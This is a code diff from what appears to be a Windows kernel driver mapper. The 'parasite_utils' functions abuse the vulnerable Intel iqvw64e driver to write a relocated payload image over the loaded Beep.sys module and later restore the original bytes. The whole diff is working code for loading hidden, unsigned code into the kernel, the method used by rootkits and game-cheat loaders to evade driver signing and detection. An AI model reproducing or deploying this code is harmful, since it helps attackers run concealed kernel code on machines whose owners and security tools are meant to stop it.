@@ -1,54 +1,71 @@
+#include <vector>
+#include <string>
+#include <Windows.h>
 #include "../include/parasite_utils.hpp"
-#include "../include/intel_driver.hpp"
 #include "../include/utils.hpp"
-#include <Psapi.h>
-#include <algorithm>
+#include "../include/intel_driver.hpp"
 
 namespace parasite_utils
 {
-	bool FindHostModule(uint32_t min_size, HostModule& out_host)
+	bool FindHostModule(uint32_t size, HostModule& host)
 	{
-		LPVOID drivers[1024];
-		DWORD cb_needed;
-		if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb_needed))
+		uint64_t ntoskrnl_base = utils::GetKernelModuleBase("ntoskrnl.exe");
+		
+		uint64_t beep_base = utils::GetKernelModuleBase("Beep.sys");
+		if (beep_base)
 		{
-			int count = cb_needed / sizeof(LPVOID);
-			for (int i = 0; i < count; i++)
-			{
-				char driver_name[MAX_PATH];
-				if (GetDeviceDriverBaseNameA(drivers[i], driver_name, sizeof(driver_name)))
-				{
-					std::string name = driver_name;
-					std::string lower_name = name;
-					std::transform(lower_name.begin(), lower_name.end(), lower_name.begin(), ::tolower);
-					
-					if (lower_name == "null.sys" || lower_name == "luafv.sys" || lower_name == "vmsidebyside.sys")
-					{
-						out_host.base = (uintptr_t)drivers[i];
-						out_host.name = name;
-						out_host.size = 0x80000; 
-						std::cout << "[+] Parasite Host Found: " << name << " (0x" << std::hex << out_host.base << ")" << std::dec << std::endl;
-						return true;
-					}
-				}
-			}
+			host.base = beep_base;
+			host.size = size;
+			return true;
 		}
-		return false;
+		
+		return false; 
 	}
 
-	bool HijackPhysicalMemory(HANDLE iqvw64e_device_handle, uintptr_t host_base, uint8_t* payload, uint32_t size)
+	bool Relocate(void* image, uint64_t target_base, uint64_t source_base)
+	{
+		uint64_t delta = target_base - source_base;
+		if (delta == 0) return true;
+
+		PIMAGE_DOS_HEADER dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(image);
+		PIMAGE_NT_HEADERS64 nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>((uint8_t*)image + dos_header->e_lfanew);
+		PIMAGE_DATA_DIRECTORY reloc_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+		
+		if (reloc_dir->Size == 0) return true;
+
+		PIMAGE_BASE_RELOCATION reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>((uint8_t*)image + reloc_dir->VirtualAddress);
+		while (reloc->VirtualAddress != 0)
+		{
+			uint32_t size = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
+			uint16_t* list = reinterpret_cast<uint16_t*>(reloc + 1);
+			for (uint32_t i = 0; i < size; i++)
+			{
+				if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64)
+				{
+					uint64_t* ptr = reinterpret_cast<uint64_t*>((uint8_t*)image + reloc->VirtualAddress + (list[i] & 0xFFF));
+					*ptr += delta;
+				}
+			}
+			reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint8_t*>(reloc) + reloc->SizeOfBlock);
+		}
+		return true;
+	}
+
+	bool HijackPhysicalMemory(HANDLE iqvw64e_device_handle, uint64_t target_base, uint8_t* payload, uint32_t size)
 	{
 		for (uint32_t i = 0; i < size; i += 0x1000)
 		{
-			uint64_t virtual_addr = host_base + i;
-			uint64_t physical_addr = 0; 
-			
-			if (!intel_driver::WriteMemory(iqvw64e_device_handle, virtual_addr, payload + i, min(0x1000, size - i)))
+			uint32_t chunk_size = (size - i > 0x1000) ? 0x1000 : (size - i);
+			if (!intel_driver::WriteMemory(iqvw64e_device_handle, target_base + i, payload + i, chunk_size))
 			{
-				std::cout << "[-] Failed to overwrite host physical page at 0x" << std::hex << virtual_addr << std::dec << std::endl;
 				return false;
 			}
 		}
 		return true;
+	}
+
+	bool RestoreHost(HANDLE iqvw64e_device_handle, uint64_t target_base, uint8_t* original_data, uint32_t size)
+	{
+		return HijackPhysicalMemory(iqvw64e_device_handle, target_base, original_data, size);
 	}
 }
